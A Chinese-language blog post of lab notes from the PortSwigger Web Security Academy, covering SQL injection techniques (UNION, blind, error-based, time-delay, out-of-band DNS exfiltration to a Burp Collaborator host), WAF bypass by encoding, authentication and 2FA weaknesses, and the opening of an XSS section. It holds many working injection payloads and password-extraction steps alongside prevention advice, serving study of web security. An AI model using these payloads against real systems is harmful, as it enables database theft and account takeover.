---
title: PortSwigger_Client_Side
permalink: /PortSwigger_Client_Side
category: 信息安全
tag:
  - 信息安全
  - 渗透测试
  - PortSwigger
author: xmy

---



PortSwigger 网站和 BurpSuite 实验记录，网站地址：https://portswigger.net/  



HTTP Host Header 相关：https://portswigger.net/web-security/host-header#what-is-the-http-host-header







# SQL Injection

在前端输入框、组件中，可以输入参数的地方，通过关键字、注释符等，导致后端处理 SQL 时执行非正常逻辑，从而泄露数据、被篡改数据等。  

例如 order by 从句、group by 从句、where 从句、-- 注释符、union 联合查询

  

Portswigger Academy 相关示例：

## retrieving hidden data 隐藏数据



web 应用中通过标签获选项筛选产品分类，再通过 url 将参数传递给后端：  

`https://insecure-website.com/products?category=Gifts`

服务端接收到请求后，转化为如下SQL，从 products 表中查询商品，released = 1 表示发布的商品 ：

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

 攻击者可以修改url为：
`https://insecure-website.com/products?category=Gifts'--`

这导致后端查询的SQL变为

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

由于 -- 注释了后面的 AND 语句导致其不生效，未 release 的产品也会被返回。  







## subverting application logic 破坏逻辑

示例是用户名密码登录框，输入用户名 wiener 密码 bluecheese  

服务端将请求转换为如下SQL：

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

如果在用户名填入 `administrator'--`，则将SQL逻辑修改为：

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```



## UNION attacks 联合注入

数据库关键字 UNION 可以实现联合查询，例如查询两个表中数据

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

### 探测方法：order by、NULL 值等

通过一些手段可以探测到字段数量

* ORDER BY 逐步测试

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

![image-20260717100622069](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717100622069.png)

当超过该表的字段，数据库会返回类似如下错误：

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

网页端则可能有 5xx 类型错误。

![image-20260717100706866](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717100706866.png)





* UNION SELECT 不断增加 NULL 占位去探测，这里利用了 NULL 会适配所有类型的数据库字段

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

当超出之后会有类似报错：

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```



### 探测字段类型

确认了字段数量后，可以使用占位符去探测出一些字段的数据类型，这里将 'a' 逐个替换掉每个字段，来观察返回的值或者错误：

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

通常不兼容的字段会导致数据库返回错误：

```
Conversion failed when converting the varchar value 'a' to data type int.
```

当没有类似报错说明该字段兼容或能适配传入字符、字符串，可以利用其检索一些关键字。  

![image-20260717101700755](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717101700755.png)

当检索出字段兼容的属性后，可以替换为我们想要检索的关键字再尝试：

![image-20260717101851225](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717101851225.png)



### 联合查询其它 table

实验中假设已知 users 表有 username、password 字段，尝试通过页面注入 union select 查询该表数据：

https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+union+select+username,password+from+users--

![image-20260717102509511](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717102509511.png)







### 探测数据库信息

可以利用上面方法和数据库的一些常用 table、关键字 来查询数据库的信息，包括版本、表名称、表结构等等。  

一些常用数据库 SQL 拼接、信息查询语句：https://portswigger.net/web-security/sql-injection/cheat-sheet



查询 MySQL 数据库版本信息实验：

![image-20260717104703117](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717104703117.png)



### 通过 content、表结构检索出用户信息实验



检索所有表：
https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+table_name,+NULL+FROM+information_schema.tables--


检索出疑似用户表名：users_oyqdgq

检索该表字段：
https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+COLUMN_NAME,+DATA_TYPE+FROM+information_schema.columns+where+table_name='users_oyqdgq'--


检索出疑似用户名及密码字段：username_purobl、password_piucuh

检索 administrator 的密码：
https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+username_purobl,+password_piucuh+FROM+users_oyqdgq+where+username_purobl='administrator'--

最终检索出 administrator 用户密码：

![image-20260717114407921](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717114407921.png)

Oracle 数据库实验，主要是默认库表名称不同：
https://0a2ssssssssssssssssssssssss9.web-security-academy.net/filter?category=Pets%27+union+select+table_name,+NULL+FROM+all_tables--

疑似表：USERS_NLUNDL
有多个疑似表不确定的情况下，可以使用字段名和表名再多查询一些信息
https://0sssssssssssss10099.web-security-academy.net/filter?category=Pets%27+union+select+COLUMN_NAME,+TABLE_NAME+FROM+all_tab_columns--

https://0asssssssssssssssss00510099.web-security-academy.net/filter?category=Pets%27+union+select+COLUMN_NAME,+TABLE_NAME+FROM+all_tab_columns+where+TABLE_NAME+=+'USERS_NLUNDL'--



疑似字段：USERNAME_XBWGGY、PASSWORD_OYNUZF

https://sssssssssssssssss99.web-security-academy.net/filter?category=Pets%27+union+select+USERNAME_XBWGGY,+PASSWORD_OYNUZF+FROM+USERS_NLUNDL+where+USERNAME_XBWGGY+=+'administrator'--







### 通过单字段检索多个值

数据库有一些字符串拼接的语法可以使用，例如 oracle ：

```
' UNION SELECT username || '~' || password FROM users--
```

通过单字段位查询多个值，返回类似如下内容，username、password 被 ~ 分隔：

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

常见数据库拼接语法：

| Oracle     | `'foo'||'bar'`                                               |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `'foo'+'bar'`                                                |
| PostgreSQL | `'foo'||'bar'`                                               |
| MySQL      | `'foo' 'bar'` [注意两个字符串之间有空格] 或者 `CONCAT('foo','bar')` |



portswigger 实验：

已知 users 表，字段有 username、password，找出 administrator 用户密码：  

探测出第二个字段可以传递字符，这里使用 )) 作为分隔符：

https://xxxxxxxxxxxxxxxxxx.web-security-academy.net/filter?category=Pets%27+union+select+null,username||'))'||password+from+users+where+username='administrator'--







## Blind SQL Injection 盲注

盲注是指应用包含 SQL Injection 漏洞，但是 HTTP 返回的内容不包含相关 SQL 结果。UNION attacks 在这种情况下很难有效果。  



conditional responses

portswigger示例：

假设一个网站使用如下 http header 跟踪用户习惯：

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

 在用户请求后会被服务端转换为如下数据库查询：

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

如果存在此 ID，web 页面返回一个 “welcome back”之类的提示展示给用户，反正则没有。此信息就可以用来探测，参考如下：

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

* 第一条注入为真，页面会展示信息
* 第二条注入为假，页面不会展示



将上面逻辑转换为想要探测的信息，组装出对应 SQL，例如已知 Users 表中有 Username、Password 字段，可以通过逐个字符猜测来拼凑出对应密码，注入如下内容

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

如果为 true，说明第一个字符大于 m，继续探测：

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

为 true 说明大于 t，继续探测

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

反复循环直到探测出完整的密码。    

常见 substring 语法，下标从 1 开始，下面的示例返回 ba 字符串：

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |





练习：

>
>
>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.
>
>The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
>To solve the lab, log in as the `administrator` user.



确认表名是否为 users：
' AND (SELECT 'a' FROM users LIMIT 1)='a

确认用户名是否为 administrator：
' AND (SELECT 'a' FROM users WHERE username = 'administrator')='a


确认 password 长度，这里使用 Burp Suite 的 Repeater，最终确认为 20：
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a



之后需要反复试每一位密码，需要用到 Burp Suite 的 Intruder 工具，这里使用 substring 函数：
' AND (SELECT substring(password,1,1) FROM users WHERE username = 'administrator')='a



![image-20260717170913151](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717170913151.png)

![image-20260717170949179](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717170949179.png)



![image-20260717170733072](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717170733072.png)







上面探测出第 1 位的值为 u，继续重复这个过程，直到剩余都找到，这里是第二位字符：

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```



可以使用 `Cluster bomb attack` 类型的 Intruder attack，定义 2 个 Payload 位，分别使用不同的值循环测试

![image-20260717174144513](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717174144513.png)

![image-20260717174226051](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717174226051.png)





![image-20260717183906668](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260717183906668.png)

根据最终 attack 结果组装出密码：

upc378pc9riff1ahiyya





### Error-based SQL injection

能够触发错误被利用的分为两种类型：

* Exploiting blind SQL injection by triggering conditional errors
  * 类似于前面的条件返回，传入不同条件，返回不同错误
* Extracting sensitive data via verbose SQL error messages
  * 错误信息包含在查询结果中被输出



先看第一种，假设前端 cookie 中包含了 TrackingId，可以被注入如下 SQL：

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

这里使用了 CASE 关键字，根据不同的条件去匹配结果，第一行 1=2 明显错误的条件，使得 语句变为 `'a'='a'` ，不会触发错误。第二行 1=1 导致计算 1/0 触发了除数为 0 的错误。  

利用类似上面的条件，可以将想要查询或者推测的信息，以 CASE 条件的形式传入进去：

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```



不同数据库类型的通过 boolean 条件触发错误语句：

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |



```
Blind SQL injection with conditional errors 的实验

' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'a' END FROM dual)='a


' AND (SELECT CASE WHEN ((SELECT username FROM users)='administrator') THEN 'administrator' ELSE 'a' END FROM dual)='a

' AND (SELECT username FROM users)='administrator


判断用户名和密码、表名等
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

判断密码长度，这里 EXISTS 关键字判断查询结果集是否有数据，后续可以用来 Intruder 猜测密码
' AND (SELECT CASE WHEN EXISTS (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20) THEN TO_CHAR(1/0)  ELSE 'a' END FROM dual)='a

猜测密码，将条件修改为 substring(password) 和每一位对比，将 x、y 分别转换为不同的 payload：
' AND (SELECT CASE WHEN EXISTS (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,x,1)='y') THEN TO_CHAR(1/0)  ELSE 'a' END FROM dual)='a


二分法在 repeater 中猜测，手动修改x为1-20，修改条件为>，将y修改为 m，每次替换剩余值一半（例如 m、s、v、x）：
' AND (SELECT CASE WHEN EXISTS (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1)>'m') THEN TO_CHAR(1/0)  ELSE 'a' END FROM dual)='a

hjxxe7wwstrpa85i8pt8


```





Extracting sensitive data via verbose SQL error messages  

有时候配置错误导致详细信息被返回给前端，例如在 id 字段注入一个 `'` 单引号，会产生如下错误：

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

这是由于 id 的值在 WHERE 从句中，单引号被注入该 statement。  

`CAST()` 函数在这种场景中可以被利用来实现一些探测或验证目的，示例如下：  

```
CAST((SELECT example_column FROM example_table) AS int)
```

通常尝试查询的字段是 string ，将其转换为一个不兼容的类型，这里是 int，就导致错误产生：

```
ERROR: invalid input syntax for type integer: "Example data"
```





You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| ---------- | ------------------------------------------------------------ |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"` |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'` |





错误信息相关实验：

与之前的类似，cookie 中有一个 TrackingId 用来跟踪用户行为，可以注入SQL，返回错误信息。这里之前的 conditional responses 方式注入被拦截，只能通过制造错误信息的形式判断。  

* 先注入一个单引号`Cookie: TrackingId=JE8zrLZCza8lzvM5';`，获得报错  

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'JE8zrLZCza8lzvM5''. Expected  char
```

* 再修改为 `Cookie: TrackingId=JE8zrLZCza8lzvM5'--;`，无报错正常返回数据
* 注入 CAST() 验证语法 `Cookie: TrackingId=JE8zrLZCza8lzvM5' AND CAST(1 AS INT)=1--;` 可以正常返回数据
* 修改上面条件 `Cookie: TrackingId=JE8zrLZCza8lzvM5' AND CAST((SELECT username FROM users) AS INT)=1--;` 尝试验证错误，获得报错：

```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'JE8zrLZCza8lzvM5' AND CAST((SELECT username FROM users) AS I'. Expected  char
```

这里有个坑，卡了很久一直以为是语法错误，实际是传入的 SQL 超过了 cookie 设计的长度限制。

* 将条件修改，可以将 TrackingId= 后面的内容删除以减少长度，``Cookie: TrackingId=' AND CAST((SELECT username FROM users) AS INT)=1--;``，获取到如下报错，说明查询到多条记录：

```
ERROR: more than one row returned by a subquery used as an expression
```

* 再次修改为 `Cookie: TrackingId=' AND CAST((SELECT username FROM users WHERE username='administrator') AS INT)=1--;`，还是超过长度限制
* 继续修改`Cookie: TrackingId=' AND CAST((SELECT username FROM users LIMIT 1) AS INT)=1--;`，这里是实验设计administrator 在第1条，实际中要根据情况调整，获得错误：

```
ERROR: invalid input syntax for type integer: "administrator"
```

* 再次调整获取 password 的内容，`Cookie: TrackingId=' AND CAST((SELECT password FROM users LIMIT 1) AS INT)=1--;`：

```
ERROR: invalid input syntax for type integer: "igi17bo6xv4ab8gly0fw"
```







### triggering time delays

当服务端正确处理错误，就无法利用上面错误响应及报错信息的技术。此时还可以尝试注入延时来判断或验证一些信息：  

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* 第一条不会触发延时
* 第二条会触发延时

基于上面类似的逻辑，可以通过服务器响应的时间来验证或获取信息。  

检索用户信息：

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

```



常见数据库延时 10s 语句：

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

常见数据库条件查询延时语句：

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`               |



实验一，注入SQL让服务器延迟10s返回，修改cookie：

```
Cookie: TrackingId=x'||pg_sleep(10)--; 
```



实验二，通过延迟猜测密码，在 Intruder 中配置 x、y 对应的 payload：

```
Cookie: TrackingId=' || CASE WHEN(SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,x,1)='y')='a' THEN pg_sleep(10) ELSE pg_sleep(0) END--;
```

![image-20260721181900590](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260721181900590.png)

attack 类型要选择 Cluster bomb attack，在所有结果中按照 Response Received 列排序，就可以拼出密码：

![image-20260721182037617](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260721182037617.png)

w9ch9omgsn2lib9hkpf2





### Out-of-band (OAST) 

有些应用可能采用异步执行 SQL 的架构，对外的服务的线程仅接收请求，转发给其它线程执行 SQL。这种场景下前面的注入技术都不能生效，无法获得反馈。  

此时通常会采用 Out-of-band 的形式触发数据回传，绕过正常数据交互流。例如 DNS、邮件等。  

通常很多主机会放行对外的 DNS 请求，因为该协议属于基础设施协议，有很多应用依赖。  

例如 SQL Server 可以通过如下语句触发一个 DNS 请求：

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

该请求会向 `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net` 发送请求，实际中可以替换为攻击者的域名以收集数据。



当找到有效的通道，就可以携带想要查询的数据：

示例：

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```



不同数据库触发 DNS 查询语句：

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`The following technique works on fully patched Oracle installations, but requires elevated privileges:`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`  |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL      | The following techniques work on Windows only:`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |





携带数据的 DNS 查询：

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |
| PostgreSQL | `create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f();` |
| MySQL      | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |



这两个相关实验需要 pro 会员，暂时跳过。  





### Preventing blind SQL Injection

和预防普通 SQL 注入一样，要小心处理参数化查询的语句，确保用户输入的内容不能拼接、构造出超预期的 SQL 查询。  

示例：

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

```

上面拼接的 SQL  语句可以修改为如下参数化的方式：

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```









## Second-order SQL injection

一级注入是指发生在应用程序通过 HTTP request 接收处理用户请求的时候。  

二级注入是指应用程序接收用户的请求并存储数据，并不立刻处理，而是在满足一定条件后再触发执行，又叫 stored SQL injection。  

通常是开发者意识到 SQL 注入的风险后，在 placeholder 之类的输入框中加入检测及预防手段后再存入数据库。  







## SQL injection in different contexts

在不同场景下可以通过不同方法构造 SQL 注入。例如有些网站使用 xml、json 之类的形式收集数据，并且放置了 WAF 之类的防御设施，可以通过一些特殊编码规则来绕过防火墙检测来注入语句。    

示例，在一段 xml 中注入查询，将其中的 S 字符转移为 16 进制以绕过 WAF 检测：

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

BurpSuite 中有 Decoder 工具，或者使用 [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) 插件可以用来做一些不同编码的字符转义。



XML 注入实验：

页面中有一段通过 xml 传入产品id、库存id，点击按钮会向服务端发送 POST 请求，返回对应商品剩余库存数量：

![image-20260722114136662](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722114136662.png)

尝试注入语句，会被 WAF 检测并拦截：

![image-20260722114913880](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722114913880.png)

可以将部分关键字或字符转义以躲避检测：

![image-20260722115023452](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722115023452.png)

![image-20260722115055050](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722115055050.png)

再替换为想要查询的语句，并可以利用拼接语句查询 `UNION SELECT username || '~' || password FROM users`：

![image-20260722115316041](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260722115316041.png)









# Authentication vulnerabilities 认证漏洞

## 认证类型

主要有3类：

* something you know ：password、answer to a security question，密码、安全问题，这属于知识因子
* something you have ：mobile phone、security token，手机、安全令牌，这属于资产因子
* something you are ：biometrics、pattern of behavior，生物特征、行为模式，这属于内在因子



## Authentication 和 Authorization  的区别

认证和鉴权：

* Authentication 是指认证，例如账号密码、人脸识别、验证码等。  

* Authorization 是鉴权，认证通过后鉴定用户拥有的权限，是否能够访问某些页面或子系统。





## 认证漏洞产生的原因

主要有2点：

* 认证机制不能防止暴力破解类攻击
* 逻辑漏洞、实现代码质量低导致攻击者能够绕开认证，又称为`Broken Authentication 认证失效` 



## 基于密码认证的脆弱点



* 暴力破解用户名：根据业务不同有所差异，有的会使用 `xxxxxx@company.com` 一类邮箱后缀的账号，使得猜测容易，或者有一些共性的账号：常用的有 root、admin、administrator、support、demo 等
* 暴力破解密码：网站可能强制要求用户设置高复杂度的密码，这样理论上更难破解，但还是有一些规律，例如通常用户更倾向于容易记忆的密码，`mypassword` 不能用就换成 `Mypassword1!` 、`Myp4$$w0rd`之类的
* 用户名枚举：适用于那些验证用户名及密码时，返回了一些信息，可以被利用来确定用户名，例如
  * 状态码
  * 错误消息
  * 响应时间



一些限制暴力破解措施的漏洞：

* IP 封禁：有些应用会检测IP有正常登录后，重置此 IP 的失败计数，会被攻击者利用在暴力破解中插入正常账号登录以绕开此机制
* 账户锁定：超过指定次数后，账号被限制登录一段时间，攻击者可以利用此点来枚举用户名









## 基于多因子认证的脆弱点

多因子主要基于前面所说三种类型，大多数网站或者应用对于生物特征(something you are)难以验证，因此很多时候都采用双因子(something you know、something you have) 2FA 认证，要求同时提供两种认证，常见的有密码+验证码（邮箱、短信、认证APP验证码）。但和其他认证类似，安全程度取决于认证的实现。  



有一些常见的漏洞：

### 绕过校验

密码认证通过后，将用户引导至验证码提交表单页面，但用户状态已经变为登录，此时通过手动输入 url 就可以访问相关页面。



### 认证逻辑漏洞

示例

* 用户发送如下请求，提交表单中的用户名密码

  ```
  POST /login-steps/first HTTP/1.1
  Host: vulnerable-website.com
  ...
  username=carlos&password=qwerty
  ```

  

* 服务器分配一个 cookie 关联到这个账户，返回给用户的验证码页面中包含该 cookie

  ```
  HTTP/1.1 200 OK
  Set-Cookie: account=carlos
  
  GET /login-steps/second HTTP/1.1
  Cookie: account=carlos
  ```

  

* 用户再次提交验证码，cookie 信息被传回服务器，登录到 cookie 关联的账户

  ```
  POST /login-steps/second HTTP/1.1
  Host: vulnerable-website.com
  Cookie: account=carlos
  ...
  verification-code=123456
  ```

* 这里示例的用户是 carlos，cookie 中包含用户信息，但如果第二次没有再校验 cookie 是否与第一次下发的 cookie 一致，黑客可以通过修改 cookie +暴力破解验证码进入其它任意用户的账户，而不需要验证码

  ```
  POST /login-steps/second HTTP/1.1
  Host: vulnerable-website.com
  Cookie: account=victim-user
  ...
  verification-code=123456
  ```

  

### 基于 token 的暴力破解

示例：

网站增加了验证码校验次数，连续几次之后重置验证码并登出用户，以防止暴力破解，但黑客可以通过 burpsuite 之类的工具自动化第一步的登录流程，反复尝试以登录。



在用户第一次登录时 GET 获取登录页面、 POST 提交用户密码、GET 获取验证码页面、POST 提交验证码，在 brupsuite 中将前3步骤作为宏：

![image-20260805120842644](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260805120842644.png)

在第3步中从页面获取到 token ，并在第 4 步中携带反复进行验证码暴力破解

![image-20260805121007306](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260805121007306.png)



![image-20260806000441652](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260806000441652.png)

![image-20260806000552380](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260806000552380.png)



上面实验是 portswigger 故意设计的缺陷，应用没有对账户锁定，OTP 验证也没有暴力破解的防护。



一个 2FA 认证应该做到：

* 验证码一次性
* 有效期短
* 账户在多次错误尝试后应该被锁定或限流





## 其它认证机制的脆弱点



### 保持登录

有一种很常见的功能是保持登录，页面常见的形式是标识着“记住我”、“保持登录”之类的勾选框。通常是生成一个持久化的 cookie ，该 cookie 作为 token 或其一部分传给服务器以通过登录认证环节，这个 cookie 最佳实践应当是有随机性难以猜测出来的。  

但是有些网站实现却将其与一部分用户信息关联拼接，例如用户名+时间戳，甚至有用密码作为其中一部分。因为黑客是很容易通过注册自己的账号来推演相关 cookie 生成过程。  

有的网站对这些值进行了加密，但如果加密方式比较简单，例如 base64 这种双向加密形式则无法提供任何防护。甚至使用单向加密方式，如果未加 salt ，黑客知道了加密算法，可以通过加密词表对 cookie 进行暴力破解。   



有些网站虽然黑客无法创建账号，但可以利用类似 XSS 之类的技术，获取用户的 cookie ，如果恰好网站应用使用开源的框架，该 cookie 的构造方式可能已经公开。  



### 重置密码

实际应用中用户可能会忘记密码，因此通常会提供一种重置密码的功能，实现有多种方式，安全措施及风险也不相同。  

* 通过邮件发送密码
  * 这种方式生成的密码应当具有很短的时效性，或者用户能够立即更改密码。
* 使用 URL 重置密码
  * 这种方案相对前一种安全，但如果生成的 URL 具有一定规律导致容易猜测，则黑客可以通过此种方式重置任意用户的密码，例如：`http://vulnerable-website.com/reset-password?user=victim-user`
  * 更可靠的实现是发送复杂、难以猜测的 URL ，不包含用户信息，且有较短的时限，用户重置后立即失效，例如 `http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8`
  * 此方式还存在密码重置链接投毒的风险
    * 通过修改 http 头(例如 X-Forwarded-Host:  )、dangling markup 之类漏洞



### 修改密码

通常修改密码功能的流程和登录类似，因此也存在类似风险。如果允许未登录情况下访问该功能页面，也会存在暴力破解密码的漏洞。  











## OAuth 认证的脆弱点

有一个专题，暂时先跳过
https://portswigger.net/web-security/oauth





## 增强认证安全

虽然无法面面俱到，仍有一些原则可以帮助我们提高安全性：

* 妥善保管用户凭证
* 不要依赖用户保障安全性
* 预防用户名枚举
* 强有力的防护暴力破解措施
* 反复核对你的验证逻辑
* 不要忘记增补的功能模块
* 实现适当的多因子认证







# XSS(Cross-site script) 跨站脚本攻击



## 概念

XSS 是一种 web 安全漏洞，攻击者篡改用户与存在漏洞的应用之间的交互，执行用户能够进行的操作和访问用户所有数据。主要运作原理是操纵存在漏洞的网站应用向用户返回恶意 JavaScript 代码，当代码在用户浏览器中执行，攻击者就掌握了其与服务器之间的交互。  



XSS 主要有3种类型：

* Reflected XSS
* Stored XSS
* DOM-based XSS



Cheat sheet：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet





## 反射型 XSS

最直接的类型形式。当应用接收到 HTTP 请求，没有经过安全处理，直接将数据包含到 response 中时，就会导致漏洞。

示例：

```
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
```

黑客可以构造出如下内容：

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
